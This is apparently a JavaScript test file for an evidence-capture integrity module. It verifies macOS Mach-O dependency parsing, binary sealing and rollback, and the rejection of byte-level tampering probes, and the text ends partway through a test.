import { describe, expect, it, vi } from "vitest";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, closeSync, copyFileSync, existsSync, linkSync, lstatSync, mkdirSync, mkdtempSync, openSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { createServer } from "node:http";
import { basename, delimiter, dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { Writable } from "node:stream";
import {
  authenticateSealedMachOPayload,
  captureExactRegularFileIdentity,
  authenticateMachODylibIdSlices,
  bytePin,
  commandWordAuthoritySha256,
  createPinnedFreshBuildSandboxProfile,
  createPinnedGraphAuthoringNetworkProfile,
  createPinnedGraphAuthoringLauncherScript,
  createPinnedGraphAuthoringExecPolicy,
  createPinnedProviderWrapperScript,
  discoverNonSystemMachODependencies,
  expandMachORuntimePath,
  inventoryRegularArtifactTree,
  isFixedSystemGit,
  parseOtoolLibraryDependencies,
  parseOtoolLibraryDependencySections,
  parseOtoolDylibId,
  parseOtoolRpaths,
  pipeByteChunks,
  pinUniqueBytes,
  pinnedBuffersInFileOrder,
  pinnedSequenceSha256,
  readCommittedGitBytes,
  readCommittedGitInventory,
  readGitCommitTree,
  rejectAncestorCargoConfiguration,
  requireExactSealedMachOSections,
  requireIdenticalMachODependencySlices,
  resolveMachORpathDependency,
  resolvePinnedXcodeTool,
  restoreDirectoryWritesSync,
  sanitizeElectronBootstrapEnvironment,
  sealMachORuntimeCopies,
  settleMediaCompletion,
  settleBeforeDeadline,
  validatePinnedGraphAuthoringCommands,
  verifyRepositoryGitAuthority,
  verifyPinnedByteInventory,
} from "../scripts/evidence-capture-integrity.mjs";

const PINNED_RG = "/private/var/folders/[redacted]/runtime/rg";
const RAW_PINNED_RG = "/private/var/folders/ab/run-authority/T/runtime/rg";
const PINNED_RG_SHA256 = createHash("sha256").update(RAW_PINNED_RG).digest("hex");
const PINNED_SED = "/private/var/folders/[redacted]/runtime/sed";
const RAW_PINNED_SED = "/private/var/folders/ab/run-authority/T/runtime/sed";
const INSPECTION_ROOT = "/private/var/folders/[redacted]/runtime/graph-client";
const RAW_INSPECTION_ROOT = "/private/var/folders/ab/run-authority/T/runtime/graph-client";
const GRAPH_AUTHORING_LAUNCHER = "/private/var/folders/[redacted]/runtime/graph-authoring-launcher";
const RAW_GRAPH_AUTHORING_LAUNCHER = "/private/var/folders/ab/run-authority/T/runtime/graph-authoring-launcher";
const GRAPH_AUTHORING_LAUNCHER_SHA256 = createHash("sha256").update(RAW_GRAPH_AUTHORING_LAUNCHER).digest("hex");
const pinnedGraphCommand = (body = "") => `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<'EOF'\n${body}\nEOF`;
const HOMEBREW_NODE_PATH = "/opt/homebrew/opt/node/bin/node";
const HOMEBREW_ZSTD_PATH = "/opt/homebrew/opt/zstd/lib/libzstd.1.dylib";
const CAPTURE_SCRIPT_PATH = join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs");
const readCaptureScript = () => readFileSync(CAPTURE_SCRIPT_PATH, "utf8");
const homebrewNodeRoot = "/opt/homebrew/Cellar/node";
const multiplyLinkedHomebrewNode = process.platform === "darwin" && existsSync(homebrewNodeRoot)
  ? readdirSync(homebrewNodeRoot).map((version) => join(homebrewNodeRoot, version, "bin", "node"))
    .find((path) => existsSync(path) && statSync(path).nlink > 1)
  : undefined;
const posixMkfifo = process.platform === "win32"
  ? undefined
  : ["/usr/bin/mkfifo", "/bin/mkfifo"].find((path) => existsSync(path));

function findTestExecutable(name) {
  const extensions = process.platform === "win32"
    ? (process.env.PATHEXT ?? ".EXE;.CMD;.BAT;.COM").split(";")
    : [""];
  for (const directory of (process.env.PATH ?? "").split(delimiter).filter(Boolean)) {
    for (const extension of extensions) {
      const candidate = join(directory, `${name}${extension}`);
      if (existsSync(candidate)) return realpathSync(candidate);
    }
  }
  return undefined;
}

const testGitPath = process.platform === "darwin" && existsSync("/usr/bin/git") ? "/usr/bin/git" : undefined;
const testArchivePath = findTestExecutable("tar");

function supportsFileSymlinks() {
  const directory = mkdtempSync(join(tmpdir(), "relayer-symlink-capability-"));
  try {
    const target = join(directory, "target");
    const link = join(directory, "link");
    writeFileSync(target, "target\n");
    symlinkSync(target, link, "file");
    return lstatSync(link).isSymbolicLink();
  } catch {
    return false;
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}

const fileSymlinksSupported = supportsFileSymlinks();

function expandFirstMachOLoadCommandRegion(bytes) {
  const fatMagic = bytes.readUInt32BE(0);
  const sliceOffset = fatMagic === 0xcafebabf ? Number(bytes.readBigUInt64BE(16))
    : fatMagic === 0xcafebabe ? bytes.readUInt32BE(16) : 0;
  let lastCommand = sliceOffset + 32;
  const commandCount = bytes.readUInt32LE(sliceOffset + 16);
  for (let commandIndex = 0; commandIndex < commandCount - 1; commandIndex += 1) {
    lastCommand += bytes.readUInt32LE(lastCommand + 4);
  }
  bytes.writeUInt32LE(bytes.readUInt32LE(lastCommand + 4) + 8, lastCommand + 4);
  bytes.writeUInt32LE(bytes.readUInt32LE(sliceOffset + 20) + 8, sliceOffset + 20);
}

function flipFirstMachOLinkeditByte(bytes) {
  const fatMagic = bytes.readUInt32BE(0);
  const sliceOffset = fatMagic === 0xcafebabf ? Number(bytes.readBigUInt64BE(16))
    : fatMagic === 0xcafebabe ? bytes.readUInt32BE(16) : 0;
  let command = sliceOffset + 32;
  const commandCount = bytes.readUInt32LE(sliceOffset + 16);
  for (let commandIndex = 0; commandIndex < commandCount; commandIndex += 1) {
    const commandKind = bytes.readUInt32LE(command);
    const commandSize = bytes.readUInt32LE(command + 4);
    if (commandKind === 0x19
      && bytes.subarray(command + 8, command + 24).toString("ascii").replace(/\0.*$/, "") === "__LINKEDIT") {
      const fileOffset = Number(bytes.readBigUInt64LE(command + 40));
      bytes[sliceOffset + fileOffset + 16] ^= 1;
      return;
    }
    command += commandSize;
  }
  throw new Error("Test Mach-O has no __LINKEDIT segment.");
}

function authenticatedInspectionAction(command, rawCommand = command
  .replaceAll(PINNED_SED, RAW_PINNED_SED)
  .replaceAll(PINNED_RG, RAW_PINNED_RG)
  .replaceAll(INSPECTION_ROOT, RAW_INSPECTION_ROOT)) {
  const hashes = commandWordAuthoritySha256(rawCommand);
  return {
    command,
    ...(rawCommand.startsWith("/") ? { relayerExecutableAuthoritySha256: hashes?.[0] } : {}),
    relayerCommandWordAuthoritySha256: hashes,
  };
}

const inspectionAuthority = {
  allowedInspectionRoots: [INSPECTION_ROOT],
  allowedInspectionRawRoots: [RAW_INSPECTION_ROOT],
  allowedSedExecutable: PINNED_SED,
  allowedSedExecutableSha256: createHash("sha256").update(RAW_PINNED_SED).digest("hex"),
  allowedRipgrepExecutable: PINNED_RG,
  allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
  requirePinnedGraph: false,
};
function validateEvidenceCommands(events, options = {}) {
  const allowedInspectionRoots = options.allowedInspectionRoots ?? [];
  const authenticatedEvents = events.map((event) => {
    const item = event?.data?.params?.item;
    if (!Array.isArray(item?.commandActions)) return event;
    return {
      ...event,
      data: { ...event.data, params: { ...event.data.params, item: {
        ...item,
        commandActions: item.commandActions.map((action) => (
          action.command?.includes(GRAPH_AUTHORING_LAUNCHER)
            ? { relayerGraphAuthoringLauncherSha256: GRAPH_AUTHORING_LAUNCHER_SHA256, ...action }
            : action
        )),
      } } },
    };
  });
  return validatePinnedGraphAuthoringCommands(authenticatedEvents, {
    allowedGraphAuthoringLauncher: GRAPH_AUTHORING_LAUNCHER,
    allowedGraphAuthoringLauncherSha256: GRAPH_AUTHORING_LAUNCHER_SHA256,
    allowedInspectionRawRoots: options.allowedInspectionRawRoots ?? allowedInspectionRoots,
    ...options,
  });
}

describe("evidence capture integrity", () => {
  it.runIf(process.platform !== "win32")(
    "restores captured read-only directory authority and refuses substituted directories",
    () => {
      const directory = mkdtempSync(join(tmpdir(), "relayer-readonly-cleanup-"));
      const source = join(directory, "source");
      const nested = join(source, "nested");
      const external = join(directory, "external");
      mkdirSync(nested, { recursive: true });
      mkdirSync(external);
      writeFileSync(join(nested, "artifact"), "immutable");
      symlinkSync(external, join(nested, "external-link"));
      chmodSync(external, 0o500);
      chmodSync(nested, 0o500);
      chmodSync(source, 0o500);
      const authorities = [nested, source].map((path) => {
        const details = lstatSync(path, { bigint: true });
        return { path, dev: details.dev, ino: details.ino };
      });
      try {
        expect(restoreDirectoryWritesSync(authorities), "captured read-only authorities are restored").toBe(true);
        expect(statSync(source).mode & 0o200, "the source directory becomes writable").toBe(0o200);
        expect(statSync(nested).mode & 0o200, "the nested directory becomes writable").toBe(0o200);
        expect(statSync(external).mode & 0o200, "an uncaptured external directory stays read-only").toBe(0);
        rmSync(source, { recursive: true });
        expect(existsSync(source), "the restored source tree is removable").toBe(false);
      } finally {
        if (existsSync(source)) restoreDirectoryWritesSync(authorities);
        chmodSync(external, 0o700);
        rmSync(directory, { recursive: true, force: true });
      }

      const substitutedRoot = mkdtempSync(join(tmpdir(), "relayer-cleanup-substitution-"));
      const substitutedSource = join(substitutedRoot, "source");
      const moved = join(substitutedRoot, "captured-source");
      mkdirSync(substitutedSource);
      chmodSync(substitutedSource, 0o500);
      const captured = lstatSync(substitutedSource, { bigint: true });
      const substitutedAuthorities = [{ path: substitutedSource, dev: captured.dev, ino: captured.ino }];
      renameSync(substitutedSource, moved);
      mkdirSync(substitutedSource);
      chmodSync(substitutedSource, 0o500);
      try {
        expect(restoreDirectoryWritesSync(substitutedAuthorities), "a directory substituted for captured authority is refused").toBe(false);
        expect(statSync(substitutedSource).mode & 0o200, "the substituted directory is never chmodded").toBe(0);
      } finally {
        chmodSync(substitutedSource, 0o700);
        chmodSync(moved, 0o700);
        rmSync(substitutedRoot, { recursive: true, force: true });
      }
    },
  );

  it("parses and rejects the structural otool contract corpus", () => {
    const libtool = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/libtool";
    const tool = "/Applications/Example.app/Contents/MacOS/tool";
    const dylib = "/Applications/Example.app/Contents/Frameworks/libexample.dylib";
    const fatTool = "/tmp/fat-tool";
    const dependencyLine = "\t/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1.0.0)";
    const cases = [
      ["multi-architecture sections parse and deduplicate",
        () => parseOtoolLibraryDependencies([
          `${libtool} (architecture x86_64):`,
          "\t/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 2000.66.0)",
          "\t@rpath/libprivate.dylib (compatibility version 1.0.0, current version 2.0.0, weak)",
          `${libtool} (architecture arm64):`,
          "\t/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 2000.66.0)",
          "\t@rpath/libprivate.dylib (compatibility version 1.0.0, current version 2.0.0, weak)",
          "",
        ].join("\n"), libtool),
        { equal: ["/usr/lib/libc++.1.dylib", "@rpath/libprivate.dylib"] }],
      ["LC_RPATH commands parse from one selected architecture",
        () => parseOtoolRpaths([
          `${tool}:`,
          "Load command 0",
          "          cmd LC_RPATH",
          "      cmdsize 48",
          "         path @loader_path/../lib (offset 12)",
          "Load command 1",
          "          cmd LC_LOAD_DYLIB",
          "         name /usr/lib/libSystem.B.dylib (offset 24)",
          "",
        ].join("\n"), tool),
        { equal: ["@loader_path/../lib"] }],
      ["an LC_RPATH without a structural path is rejected",
        () => parseOtoolRpaths(`${tool}:\nLoad command 0\n cmd LC_RPATH\n`, tool),
        { throws: "without a structural path" }],
      ["a structural LC_ID_DYLIB authenticates",
        () => parseOtoolDylibId(`${dylib}:\n@rpath/libexample.dylib\n`, dylib),
        { equal: "@rpath/libexample.dylib" }],
      ["an executable without LC_ID_DYLIB parses to null",
        () => parseOtoolDylibId(`${dylib}:\n`, dylib),
        { equal: null }],
      ["multiple dylib IDs are malformed",
        () => parseOtoolDylibId(`${dylib}:\n@rpath/one.dylib\n@rpath/two.dylib\n`, dylib),
        { throws: "malformed dylib ID" }],
      ["duplicate architecture sections are rejected",
        () => parseOtoolLibraryDependencies(`${fatTool} (architecture arm64):\n${dependencyLine}\n${fatTool} (architecture arm64):\n${dependencyLine}\n`, fatTool),
        { throws: "Invalid or duplicate" }],
      ["mixed thin and architecture sections are rejected",
        () => parseOtoolLibraryDependencies(`${fatTool}:\n${dependencyLine}\n${fatTool} (architecture arm64):\n${dependencyLine}\n`, fatTool),
        { throws: "mixed thin and architecture" }],
      ["a malformed section header is rejected",
        () => parseOtoolLibraryDependencies(`${fatTool} (architecture arm64):\n${fatTool} (architecture x86_64)\n`, fatTool),
        { throws: "Malformed otool -L section header" }],
      ["a malformed dependency line is rejected",
        () => parseOtoolLibraryDependencies(`${fatTool} (architecture arm64):\n\t/usr/lib/libSystem.B.dylib\n`, fatTool),
        { throws: "Malformed otool -L dependency" }],
    ];
    expect(cases, "otool contract inventory").toHaveLength(10);
    for (const [label, run, check] of cases) {
      let value;
      let thrown;
      try { value = run(); } catch (error) { thrown = error; }
      if ("throws" in check) {
        expect.soft(thrown?.message ?? "(did not throw)", label).toContain(check.throws);
      } else {
        expect.soft(thrown?.message, `${label} (unexpectedly threw)`).toBeUndefined();
        expect.soft(value, label).toEqual(check.equal);
      }
    }
  });

  it("anchors Mach-O runtime paths and enforces identical slice and sealed-section authority", () => {
    const anchors = {
      loaderPath: "/Applications/Example.app/Contents/Frameworks/libloader.dylib",
      executablePath: "/Applications/Example.app/Contents/MacOS/tool",
    };
    expect(expandMachORuntimePath("@executable_path/../lib/", anchors), "executable-anchored expansion").toBe("/Applications/Example.app/Contents/lib");
    expect(expandMachORuntimePath("@loader_path/Helpers", anchors), "loader-anchored expansion").toBe("/Applications/Example.app/Contents/Frameworks/Helpers");
    expect(() => expandMachORuntimePath("relative/search/path", anchors), "relative paths have no search fallback").toThrow("Unsupported relative Mach-O runtime path");

    const sealedRejections = [
      ["a dependency substitution inside the private runtime", {
        sourceSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib", "/opt/lib/libalpha.dylib"] }],
        sealedSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib", "@loader_path/libbeta.dylib"] }],
        sourceId: null,
        targetNames: new Set(["libalpha.dylib", "libbeta.dylib"]),
        targetName: "node",
      }, "differs from its authenticated source architecture"],
      ["an invented sealed architecture inventory", {
        sourceSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib"] }],
        sealedSections: [
          { architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib"] },
          { architecture: "x86_64", dependencies: ["/usr/lib/libSystem.B.dylib"] },
        ],
        sourceId: null,
        targetNames: new Set(),
        targetName: "node",
      }, "matching architecture inventories"],
    ];
    expect(sealedRejections, "sealed-section rejection inventory").toHaveLength(2);
    for (const [label, input, message] of sealedRejections) {
      expect.soft(() => requireExactSealedMachOSections(input), label).toThrow(message);
    }

    const executable = "/Applications/Example.app/Contents/MacOS/tool";
    const sections = parseOtoolLibraryDependencySections([
      `${executable} (architecture x86_64):`,
      "\t@rpath/libshared.dylib (compatibility version 1.0.0, current version 2.0.0)",
      `${executable} (architecture arm64):`,
      "\t@rpath/libshared.dylib (compatibility version 1.0.0, current version 2.0.0)",
      "",
    ].join("\n"), executable);
    expect(requireIdenticalMachODependencySlices(sections, (dependency) => ({
      system: false,
      name: "libshared.dylib",
      source: `/private/runtime/${basename(dependency)}`,
      sha256: "b".repeat(64),
    })), "identical universal slice authority").toEqual([{
      dependency: "@rpath/libshared.dylib",
      system: false,
      name: "libshared.dylib",
      source: "/private/runtime/libshared.dylib",
      sha256: "b".repeat(64),
    }]);
    const divergentRpaths = { x86_64: "/opt/x86_64/lib", arm64: "/opt/arm64/lib" };
    expect(() => requireIdenticalMachODependencySlices(sections, (dependency, architecture) => ({
      system: false,
      name: "libshared.dylib",
      source: `${divergentRpaths[architecture]}/${basename(dependency)}`,
      sha256: "a".repeat(64),
    })), "divergent per-slice rpath authority").toThrow("different runtime authority");

    const nestedDependency = "@rpath/libnested.dylib";
    const nestedExisting = new Set(["/parent-a/lib/libnested.dylib", "/parent-b/lib/libnested.dylib"]);
    expect(() => requireIdenticalMachODependencySlices(
      [
        { architecture: "parent-a", dependencies: [nestedDependency] },
        { architecture: "parent-b", dependencies: [nestedDependency] },
      ],
      (installName, architecture) => ({
        system: false,
        name: basename(installName),
        source: resolveMachORpathDependency(installName, [`/${architecture}/lib`], (path) => nestedExisting.has(path)),
        sha256: "c".repeat(64),
      }),
    ), "divergent nested parent run-path authority").toThrow("different runtime authority");

    const directory = mkdtempSync(join(tmpdir(), "relayer-dylib-id-authority-"));
    const expectedSource = join(directory, "libactual.1.2.3.dylib");
    const wrongSource = join(directory, "libattacker.1.2.3.dylib");
    try {
      writeFileSync(expectedSource, "authenticated dylib bytes\n");
      writeFileSync(wrongSource, "different dylib bytes\n");
      const expectedSha256 = createHash("sha256").update(readFileSync(expectedSource)).digest("hex");
      const id = "@rpath/libactual.1.dylib";
      const idSections = [
        { architecture: "x86_64", dependencies: [id, "/usr/lib/libSystem.B.dylib"] },
        { architecture: "arm64", dependencies: [id, "/usr/lib/libSystem.B.dylib"] },
      ];
      expect(authenticateMachODylibIdSlices({
        sections: idSections,
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      }), "every slice resolving to the exact image authenticates").toBe(id);
      expect(() => authenticateMachODylibIdSlices({
        sections: idSections,
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: (_sliceId, architecture) => ({
          source: architecture === "arm64" ? wrongSource : expectedSource,
          sha256: expectedSha256,
        }),
      }), "a slice resolving to different bytes").toThrow("does not resolve to the authenticated image");
      expect(() => authenticateMachODylibIdSlices({
        sections: idSections,
        dylibIds: [id, null],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      }), "a slice missing its LC_ID_DYLIB").toThrow("missing or different LC_ID_DYLIB");
      expect(() => authenticateMachODylibIdSlices({
        sections: idSections.map((section) => ({ ...section, dependencies: ["/usr/lib/libSystem.B.dylib"] })),
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      }), "an ID absent from the architecture dependency records").toThrow("not present in its architecture dependency records");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });
  it.runIf(process.platform === "darwin" && existsSync(HOMEBREW_NODE_PATH))(
    "rejects every Homebrew Node payload, load-command, and fat-header substitution probe",
    () => {
      const source = readFileSync(realpathSync(HOMEBREW_NODE_PATH));
      const probes = [
        { command: 0x80000028, mutate: (bytes, offset) => bytes.writeBigUInt64LE(bytes.readBigUInt64LE(offset + 8) + 1n, offset + 8) },
        { command: 0x19, mutate: (bytes, offset) => bytes.writeUInt32LE(bytes.readUInt32LE(offset + 68) ^ 1, offset + 68) },
        { command: 0x8000001c, mutate: (bytes, offset) => { bytes[offset + bytes.readUInt32LE(offset + 8)] ^= 1; } },
      ];
      for (const probe of probes) {
        const mutated = Buffer.from(source);
        let offset = -1;
        for (let cursor = 0; cursor + 72 <= mutated.length; cursor += 4) {
          if (mutated.readUInt32LE(cursor) === probe.command) { offset = cursor; break; }
        }
        expect(offset, `probe finds load command ${probe.command.toString(16)}`).toBeGreaterThanOrEqual(0);
        probe.mutate(mutated, offset);
        expect(() => authenticateSealedMachOPayload(source, mutated), `probe rejects load command ${probe.command.toString(16)} substitution`).toThrow(/load command|authority/);
      }
      const expanded = Buffer.from(source);
      expandFirstMachOLoadCommandRegion(expanded);
      expect(() => authenticateSealedMachOPayload(source, expanded), "an expanded load-command region").toThrow(/command region|load command|code-signature|fixed header/);
      const shifted = Buffer.from(source);
      const fatMagic = shifted.readUInt32BE(0);
      const sliceOffset = fatMagic === 0xcafebabf ? Number(shifted.readBigUInt64BE(16))
        : fatMagic === 0xcafebabe ? shifted.readUInt32BE(16) : 0;
      const commandEnd = sliceOffset + 32 + shifted.readUInt32LE(sliceOffset + 20);
      let dylibCommand = sliceOffset + 32;
      while (dylibCommand < commandEnd && shifted.readUInt32LE(dylibCommand) !== 0xc) {
        dylibCommand += shifted.readUInt32LE(dylibCommand + 4);
      }
      expect(dylibCommand, "probe finds a dylib load command").toBeLessThan(commandEnd);
      const dylibSize = shifted.readUInt32LE(dylibCommand + 4);
      shifted.copy(shifted, dylibCommand + dylibSize + 8, dylibCommand + dylibSize, commandEnd);
      shifted.fill(0, dylibCommand + dylibSize, dylibCommand + dylibSize + 8);
      shifted.writeUInt32LE(dylibSize + 8, dylibCommand + 4);
      shifted.writeUInt32LE(shifted.readUInt32LE(sliceOffset + 20) + 8, sliceOffset + 20);
      expect(() => authenticateSealedMachOPayload(source, shifted), "a shifted dylib install-name command").toThrow(/dylib install name|load-command|command region/);
      let linkedit = -1;
      for (let cursor = 0; cursor + 72 <= source.length; cursor += 4) {
        if (source.readUInt32LE(cursor) === 0x19
          && source.subarray(cursor + 8, cursor + 24).toString("ascii").replace(/\0.*$/, "") === "__LINKEDIT") {
          linkedit = cursor;
          break;
        }
      }
      expect(linkedit, "probe finds the __LINKEDIT segment").toBeGreaterThanOrEqual(0);
      for (const offset of [32, 48]) {
        const mutated = Buffer.from(source);
        mutated.writeBigUInt64LE(mutated.readBigUInt64LE(linkedit + offset) + (offset === 32 ? 0x100000n : 1n), linkedit + offset);
        expect(() => authenticateSealedMachOPayload(source, mutated), `inflated __LINKEDIT ${offset === 32 ? "fileoff" : "vmaddr"}`).toThrow(/__LINKEDIT sizes|segment bounds/);
      }
      const mutatedLinkedit = Buffer.from(source);
      flipFirstMachOLinkeditByte(mutatedLinkedit);
      expect(() => authenticateSealedMachOPayload(source, mutatedLinkedit), "a flipped __LINKEDIT payload byte").toThrow("__LINKEDIT semantic payload differs");

      const fatOffset = 4096;
      const fat = Buffer.alloc(fatOffset + source.length);
      fat.writeUInt32BE(0xcafebabf, 0);
      fat.writeUInt32BE(1, 4);
      fat.writeUInt32BE(0x0100000c, 8);
      fat.writeUInt32BE(0, 12);
      fat.writeBigUInt64BE(BigInt(fatOffset), 16);
      fat.writeBigUInt64BE(BigInt(source.length), 24);
      fat.writeUInt32BE(12, 32);
      fat.writeUInt32BE(0, 36);
      source.copy(fat, fatOffset);
      expect(() => authenticateSealedMachOPayload(fat, fat), "a well-formed fat wrapper authenticates").not.toThrow();
      const badAlign = Buffer.from(fat);
      badAlign.writeUInt32BE(13, 32);
      expect(() => authenticateSealedMachOPayload(fat, badAlign), "a fat alignment substitution").toThrow(/alignment|fat Mach-O architecture authority/);
      const badReserved = Buffer.from(fat);
      badReserved.writeUInt32BE(1, 36);
      expect(() => authenticateSealedMachOPayload(fat, badReserved), "a fat reserved-field substitution").toThrow("fat Mach-O architecture authority");
    },
    30_000,
  );

  it.runIf(process.platform === "darwin")(
    "rolls every sealing target back after late-publication and resigned-__LINKEDIT failures",
    () => {
      const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-seal-rollback-")));
      const otoolPath = resolvePinnedXcodeTool("otool");
      const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
      const sources = [realpathSync("/bin/echo"), realpathSync("/bin/cat")];
      const specs = sources.map((source, index) => {
        const target = join(directory, `tool-${index}`);
        copyFileSync(source, target);
        chmodSync(target, 0o700);
        return {
          source, target,
          sourceSha256: createHash("sha256").update(readFileSync(source)).digest("hex"),
          targetAuthority: captureExactRegularFileIdentity(target),
        };
      });
      const originals = specs.map((spec) => {
        const bytes = readFileSync(spec.target);
        return {
          bytes,
          digest: createHash("sha256").update(bytes).digest("hex"),
          identity: captureExactRegularFileIdentity(spec.target),
        };
      });
      const expectFullRollback = (phase) => {
        for (const [index, spec] of specs.entries()) {
          const restored = readFileSync(spec.target);
          expect(createHash("sha256").update(restored).digest("hex"), `${phase}: tool-${index} bytes roll back`).toBe(originals[index].digest);
          expect(restored, `${phase}: tool-${index} exact bytes roll back`).toEqual(originals[index].bytes);
          const identity = captureExactRegularFileIdentity(spec.target);
          expect([identity.dev, identity.ino], `${phase}: tool-${index} inode rolls back`).toEqual([originals[index].identity.dev, originals[index].identity.ino]);
        }
      };
      try {
        expect(() => sealMachORuntimeCopies({
          sourceSpecs: specs,
          runtimeRoot: directory,
          rootExecutable: specs[0].target,
          otoolPath,
          installNameToolPath,
          afterTargetPublication: (target) => {
            const expanded = readFileSync(target);
            expandFirstMachOLoadCommandRegion(expanded);
            chmodSync(target, 0o700);
            writeFileSync(target, expanded);
            throw new Error("late validation failure after command-region substitution");
          },
        }), "the late publication failure surfaces").toThrow("late validation failure");
        expectFullRollback("late publication");

        for (const spec of specs) spec.targetAuthority = captureExactRegularFileIdentity(spec.target);
        expect(() => sealMachORuntimeCopies({
          sourceSpecs: specs,
          runtimeRoot: directory,
          rootExecutable: specs[0].target,
          otoolPath,
          installNameToolPath,
          afterCodesign: (target, signScratch) => {
            if (target !== specs[1].target) return;
            const substituted = readFileSync(signScratch);
            flipFirstMachOLinkeditByte(substituted);
            writeFileSync(signScratch, substituted);
            execFileSync("/usr/bin/codesign", ["--force", "--sign", "-", signScratch], {
              env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C" },
            });
          },
        }), "the resigned __LINKEDIT substitution surfaces").toThrow("__LINKEDIT semantic payload differs");
        expectFullRollback("resigned __LINKEDIT");
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }
    },
    60_000,
  );

  it.runIf(process.platform === "darwin")("resolves Xcode tools independently of hostile DEVELOPER_DIR", () => {
    const previous = process.env.DEVELOPER_DIR;
    process.env.DEVELOPER_DIR = join(tmpdir(), "hostile-developer-dir");
    try {
      const otool = resolvePinnedXcodeTool("otool");
      const installNameTool = resolvePinnedXcodeTool("install_name_tool");
      expect(otool, "otool resolves inside the real Developer directory").toContain("/Contents/Developer/");
      expect(installNameTool, "install_name_tool resolves inside the real Developer directory").toContain("/Contents/Developer/");
      expect(otool, "otool ignores the hostile DEVELOPER_DIR").not.toContain("hostile-developer-dir");
      expect(installNameTool, "install_name_tool ignores the hostile DEVELOPER_DIR").not.toContain("hostile-developer-dir");
    } finally {
      if (previous === undefined) delete process.env.DEVELOPER_DIR;
      else process.env.DEVELOPER_DIR = previous;
    }
  });

  it.runIf(process.platform === "darwin")(
    "resolves, closes, and parses the real Xcode Mach-O authority",
    () => {
      const executable = realpathSync(execFileSync("/usr/bin/xcrun", ["--find", "ld"], { encoding: "utf8" }).trim());
      const sections = parseOtoolLibraryDependencySections(
        execFileSync("/usr/bin/otool", ["-L", executable], { encoding: "utf8" }),
        executable,
      );
      const privateNames = ["libLTO.dylib", "libcodedirectory.dylib", "libswiftDemangle.dylib", "libtapi.dylib"];
      const resolvedByArchitecture = new Map();
      for (const section of sections) {
        const rpaths = parseOtoolRpaths(execFileSync("/usr/bin/otool", [
          "-l", "-arch", section.architecture, executable,
        ], { encoding: "utf8" }), executable).map((path) => expandMachORuntimePath(path, {
          loaderPath: executable,
          executablePath: executable,
        }));
        const resolved = Object.fromEntries(section.dependencies
          .filter((dependency) => dependency.startsWith("@rpath/"))
          .map((dependency) => {
            const name = basename(dependency);
            const source = rpaths.map((root) => join(root, name)).find(existsSync);
            expect(source, `ld ${section.architecture} resolves ${name}`).toBeDefined();
            return [name, realpathSync(source)];
          }));
        expect(Object.keys(resolved).sort(), `ld ${section.architecture} private dependency names`).toEqual(privateNames);
        resolvedByArchitecture.set(section.architecture, resolved);
      }
      expect(resolvedByArchitecture.get("arm64"), "both ld slices resolve identical private authority").toEqual(resolvedByArchitecture.get("x86_64"));

      const closure = discoverNonSystemMachODependencies({ executables: [executable], timeoutMs: 30_000 });
      expect(closure.map(([name]) => name), "the recursive ld closure names").toEqual([
        "libcodedirectory.dylib",
        "libLTO.dylib",
        "libswiftDemangle.dylib",
        "libtapi.dylib",
      ]);
      for (const [name, authority] of closure) {
        expect(basename(authority.source), `${name} closure source name`).toBe(name);
        expect(authority.sha256, `${name} closure authority digest`).toMatch(/^[a-f0-9]{64}$/);
      }

      const libtool = realpathSync(execFileSync("/usr/bin/xcrun", ["--find", "libtool"], { encoding: "utf8" }).trim());
      expect(parseOtoolLibraryDependencies(
        execFileSync("/usr/bin/otool", ["-L", libtool], { encoding: "utf8" }),
        libtool,
      ), "the installed universal libtool closure parses").toEqual([
        "/usr/lib/libSystem.B.dylib",
        "/usr/lib/libc++.1.dylib",
      ]);
    },
    60_000,
  );
  it.runIf(process.platform === "darwin" && (existsSync(HOMEBREW_NODE_PATH) || existsSync(HOMEBREW_ZSTD_PATH)))(
    "authenticates, seals, executes, and swap-guards the real Homebrew dylib closure",
    () => {
      const otoolPath = resolvePinnedXcodeTool("otool");
      const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
      const zstdAvailable = existsSync(HOMEBREW_ZSTD_PATH);
      const nodeAvailable = existsSync(HOMEBREW_NODE_PATH);

      if (zstdAvailable) {
        const stableAbiPath = HOMEBREW_ZSTD_PATH;
        const executable = realpathSync(stableAbiPath);
        expect(discoverNonSystemMachODependencies({ executables: [executable], timeoutMs: 30_000 }),
          "the versioned zstd dylib has a system-only closure").toEqual([]);
        const id = parseOtoolDylibId(execFileSync("/usr/bin/otool", ["-D", executable], { encoding: "utf8" }), executable);
        expect(id, "the zstd dylib ID is its stable ABI symlink path").toBe(stableAbiPath);
        expect(realpathSync(id), "the zstd dylib ID resolves to the versioned image").toBe(executable);
      }

      if (zstdAvailable) {
        const cases = [
          { label: "a zstd target swap after install_name_tool", source: realpathSync(HOMEBREW_ZSTD_PATH), hook: "afterInstallNameTool" },
